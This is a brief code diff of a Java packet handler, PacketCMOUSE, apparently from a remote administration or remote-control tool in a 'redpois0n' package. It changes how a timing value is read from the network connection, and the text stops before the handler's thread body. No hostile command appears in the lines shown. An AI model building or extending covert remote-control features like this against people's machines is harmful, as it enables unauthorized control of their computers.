@@ -7,12 +7,11 @@ import java.util.Random;
 import com.redpois0n.Connection;
 import com.redpois0n.Main;
 
-
 public class PacketCMOUSE extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
-		final int time = Integer.parseInt(Connection.readLine());
+		final int time = Connection.readInt();
 		new Thread() {
 			public void run() {
 				try {
